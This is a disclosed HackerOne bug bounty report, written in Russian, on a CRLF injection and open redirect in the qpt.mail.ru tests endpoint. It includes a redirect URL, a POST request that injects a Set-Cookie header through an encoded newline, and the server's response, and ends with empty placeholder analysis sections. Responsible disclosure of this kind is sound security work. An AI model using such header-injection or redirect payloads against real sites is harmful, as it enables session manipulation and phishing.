---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '181939'
original_report_id: '181939'
title: '[qpt.mail.ru] CRLF Injection / Open Redirect'
weakness: HTTP Response Splitting
team_handle: mailru
created_at: '2016-11-13T17:00:04.415Z'
disclosed_at: '2017-03-02T13:18:14.817Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- http-response-splitting
---

# [qpt.mail.ru] CRLF Injection / Open Redirect

## Metadata

- HackerOne Report ID: 181939
- Weakness: HTTP Response Splitting
- Program: mailru
- Disclosed At: 2017-03-02T13:18:14.817Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Уязвимый сценарий**: /tests/
**Уязвимый параметр**: qpt_question_url

**Пример Open Redirect**:
http://qpt.mail.ru/tests/?action=answer&test_id=149&qpt_question_url=http%3A%2F%2Fcard.krugdoveriya.mail.ru.blackfan.ru&qpt_result_url=http%3A%2F%2Fcard.krugdoveriya.mail.ru%2Ftest.html&question_id=1406&qpt_test_state=1406%3A0&answer=6449

**Пример CRLF Injection** (Set-Cookie: test=inj; domain=.mail.ru):
https://blackfan.ru/bugbounty/qpt.mail.ru_gfunjgblnjfgilzugniurg.html

Тело ответа перезаписать не удалось, но учитывая, что Location заголовок пропадает и строка странно обрабатывается (Set-cookie=test=test заменяется на Set-cookie: test=test), теоретически можно довести до чего-нибудь более интересного.

**HTTP Request**
```http
POST /tests/ HTTP/1.1
Host: qpt.mail.ru
Content-Type: application/x-www-form-urlencoded
Content-Length: 245

action=answer&test_id=149&qpt_question_url=http%3A%2F%2Fcard.krugdoveriya.mail.ru/%0aSet-Cookie=test=test%3bdomain=.mail.ru%3b&qpt_result_url=http%3A%2F%2Fcard.krugdoveriya.mail.ru%2Ftest.html&question_id=1406&qpt_test_state=1406%3A0&answer=6449
```

**HTTP Response**
```http
HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Sun, 13 Nov 2016 16:56:01 GMT
Content-Type: text/html; charset=windows-1251
Connection: keep-alive
Status: 302 Moved Temporarily
Cache-control: no-cache
Set-cookie: test=inj;domain=.mail.ru;?qpt_test_state=1407%3a0%3a1406-6449&test_id=149&question_id=1407
Content-Length: 0
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
